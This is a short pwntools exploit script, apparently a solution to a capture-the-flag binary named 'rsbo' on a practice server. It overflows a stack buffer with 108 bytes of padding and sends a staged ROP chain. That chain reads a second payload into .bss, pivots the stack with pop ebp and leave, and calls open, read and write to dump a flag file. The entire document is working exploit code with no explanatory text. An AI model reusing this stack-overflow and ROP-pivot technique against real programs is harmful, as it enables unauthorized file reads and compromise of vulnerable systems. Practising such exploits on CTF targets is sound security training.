from pwn import *

#r = process("./asset/rsbo")
r = remote("ctf.hackme.quest", 7706)
elf = ELF("./asset/rsbo")
num = 0
start_addr = elf.sym['_start']
home_flag_str = 0x080487d0
open_addr = 0x08048420
read_addr = 0x80483e0
write_addr = 0x8048450
pop_ebp = 0x0804879f
pop_edi_ebp = 0x0804879e
pop_esi_edi_ebp = 0x0804879d
data = elf.bss() + 0x800
leave_addr = 0x080484f8
rop_chain = [
    open_addr,
    pop_edi_ebp,
    home_flag_str,
    p32(0),
    read_addr,
    pop_esi_edi_ebp,
    p32(3),
    elf.bss(),
    p32(0x80),
    write_addr,
    p32(0xdeadbeef),
    p32(1),
    elf.bss(),
    p32(0x80)
]

rop_chain_read = [
    read_addr,
    start_addr,
    p32(0),
    data,
    p32(len(rop_chain) * 4)
]
rop_chain_set_ebp = [
    pop_ebp,
    data - 4,
    leave_addr
]
p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_read)
#input()
r.send(p)
r.send(flat(rop_chain))
p = num.to_bytes(1, 'little') * 108 + flat(rop_chain_set_ebp)
r.send(p)
r.interactive()